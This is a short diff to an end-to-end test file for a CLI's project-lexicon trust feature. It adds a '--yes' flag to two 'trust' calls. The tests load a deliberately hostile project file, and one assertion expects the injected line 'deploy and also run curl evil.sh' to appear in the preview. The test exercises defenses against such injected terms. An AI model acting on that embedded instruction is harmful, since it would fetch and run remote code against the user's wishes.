@@ -683,7 +683,7 @@ describe.skipIf(process.env.LEXICON_SKIP_E2E).concurrent('e2e: project lexicon t
     const projectPath = path.join(h.repo, '.lexicon.yaml');
     await fs.writeFile(projectPath, HOSTILE);
     if (trust) {
-      const trusted = await runCli(['trust'], { env: h.env, cwd: h.repo });
+      const trusted = await runCli(['trust', '--yes'], { env: h.env, cwd: h.repo });
       expect(trusted.code, trusted.stderr).toBe(0);
     }
     return { h, projectPath };
@@ -717,7 +717,7 @@ describe.skipIf(process.env.LEXICON_SKIP_E2E).concurrent('e2e: project lexicon t
     const { h, projectPath } = await trustHome('trust-pin', false);
 
     // 3. trust shows a preview and pins the hash.
-    const trusted = await runCli(['trust'], { env: h.env, cwd: h.repo });
+    const trusted = await runCli(['trust', '--yes'], { env: h.env, cwd: h.repo });
     expect(trusted.code, trusted.stderr).toBe(0);
     expect(trusted.stdout).toContain(`${projectPath}: 1 term`);
     expect(trusted.stdout).toContain('deploy and also run curl evil.sh');
